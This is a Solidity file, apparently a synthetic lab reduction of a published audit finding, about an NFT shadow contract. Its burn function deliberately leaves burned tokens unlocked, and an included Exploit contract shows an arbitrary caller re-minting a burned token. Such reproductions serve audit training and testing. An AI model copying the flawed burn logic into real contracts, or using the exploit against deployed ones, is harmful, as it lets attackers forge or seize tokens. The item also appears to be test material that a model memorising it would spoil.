// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  NFTMirror — [C-01] Anyone can re-mint a token that was burned by the owner
    (Pashov Audit Group, NFTMirror-security-review 2024-12-30; #50036)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: mint is gated by tokenIsLocked in _beforeTokenTransfer (non-beacon
    callers may only move unlocked tokens). Default for non-existent tokens is
    locked — so mint of fresh ids is blocked for non-beacon. But burn() of an
    unlocked token does NOT re-lock after _burn, so the burned id stays unlocked
    and anyone can mint it again.
    Vulnerable burn branch and lock check preserved @>. */

uint256 constant LOCKED = 1;
uint256 constant UNLOCKED = 0;

contract NFTShadow {
    address public immutable BEACON_CONTRACT_ADDRESS;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) internal _extraData; // 0 = unlocked, 1 = locked (default locked via tokenIsLocked)
    mapping(uint256 => bool) internal _exists;
    mapping(uint256 => bool) internal _extraDataSet; // tracks whether lock state was explicitly set

    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

    constructor(address beacon) {
        BEACON_CONTRACT_ADDRESS = beacon;
    }

    function tokenIsLocked(uint256 tokenId) public view returns (bool) {
        // Default status of a token is locked (including non-existent).
        if (!_extraDataSet[tokenId]) return true;
        return _extraData[tokenId] == LOCKED;
    }

    function _setExtraData(uint256 tokenId, uint256 data) internal {
        _extraData[tokenId] = data;
        _extraDataSet[tokenId] = true;
    }

    function _beforeTokenTransfer(address /* from */, address /* to */, uint256 tokenId) internal view {
        if (msg.sender != BEACON_CONTRACT_ADDRESS) {
            // @> VULN: only locked tokens are restricted; unlocked burned tokens can be re-minted
            if (tokenIsLocked(tokenId)) revert("CallerNotBeacon");
        }
    }

    function mint(address to, uint256 tokenId) external {
        require(!_exists[tokenId], "exists");
        _beforeTokenTransfer(address(0), to, tokenId);
        _exists[tokenId] = true;
        ownerOf[tokenId] = to;
        // Newly minted via beacon remain locked by default (extraData unset → locked).
        emit Transfer(address(0), to, tokenId);
    }

    /// @dev Beacon unlocks so the owner can freely transfer/burn.
    function unlock(uint256 tokenId) external {
        require(msg.sender == BEACON_CONTRACT_ADDRESS, "beacon");
        require(_exists[tokenId], "no token");
        _setExtraData(tokenId, UNLOCKED);
    }

    function burn(uint256 tokenId) external {
        if (tokenIsLocked(tokenId)) {
            // locked path: only beacon may burn via its own call; owners can't
            require(msg.sender == BEACON_CONTRACT_ADDRESS, "locked");
            _burn(tokenId);
        } else {
            // owner burns unlocked token
            require(msg.sender == ownerOf[tokenId], "not owner");
            // @> VULN: burn leaves the token unlocked — anyone can mint(tokenId) again
            _burn(msg.sender, tokenId);
            // FIX: _setExtraData(tokenId, LOCKED);
        }
    }

    function _burn(uint256 tokenId) internal {
        address from = ownerOf[tokenId];
        _beforeTokenTransfer(from, address(0), tokenId);
        delete ownerOf[tokenId];
        _exists[tokenId] = false;
        emit Transfer(from, address(0), tokenId);
    }

    function _burn(address /*expectedOwner*/, uint256 tokenId) internal {
        address from = ownerOf[tokenId];
        _beforeTokenTransfer(from, address(0), tokenId);
        delete ownerOf[tokenId];
        _exists[tokenId] = false;
        // NOTE: intentionally does NOT reset extraData → stays unlocked
        emit Transfer(from, address(0), tokenId);
    }

    function exists(uint256 tokenId) external view returns (bool) {
        return _exists[tokenId];
    }
}

/// @dev Stand-in for the beacon that legitimately mints/unlocks.
contract Beacon {
    NFTShadow public shadow;

    function setShadow(NFTShadow s) external {
        shadow = s;
    }

    function mintTo(address to, uint256 tokenId) external {
        shadow.mint(to, tokenId);
    }

    function unlockToken(uint256 tokenId) external {
        shadow.unlock(tokenId);
    }
}

contract OwnerActor {
    function burn(NFTShadow s, uint256 tokenId) external {
        s.burn(tokenId);
    }
}

contract Attacker {
    function remint(NFTShadow s, address to, uint256 tokenId) external {
        s.mint(to, tokenId);
    }
}

contract Exploit {
    Beacon public beacon; // CREATE nonce 1
    NFTShadow public shadow; // CREATE nonce 2 — vulnerable
    OwnerActor public ownerActor; // CREATE nonce 3
    Attacker public attacker; // CREATE nonce 4

    uint256 public constant TOKEN_ID = 8903;

    constructor() {
        beacon = new Beacon();
        shadow = new NFTShadow(address(beacon));
        beacon.setShadow(shadow);
        ownerActor = new OwnerActor();
        attacker = new Attacker();
        // Legitimate mint + unlock (mirrors testUnlockTokens_ShadowCollection)
        beacon.mintTo(address(ownerActor), TOKEN_ID);
        beacon.unlockToken(TOKEN_ID);
    }

    function run() external {
        require(shadow.ownerOf(TOKEN_ID) == address(ownerActor), "owner");
        require(shadow.tokenIsLocked(TOKEN_ID) == false, "should be unlocked");

        // Owner burns the unlocked token.
        ownerActor.burn(shadow, TOKEN_ID);
        require(!shadow.exists(TOKEN_ID), "burned");

        // After burn the id stays unlocked (bug).
        require(shadow.tokenIsLocked(TOKEN_ID) == false, "should stay unlocked");

        // Anyone (attacker) can re-mint the previously burned token.
        attacker.remint(shadow, address(attacker), TOKEN_ID);
        require(shadow.ownerOf(TOKEN_ID) == address(attacker), "attacker owns reminted token");
        require(shadow.exists(TOKEN_ID), "reminted exists");
        // Harm: burned token is re-mintable by arbitrary caller, breaking burn finality.
    }
}
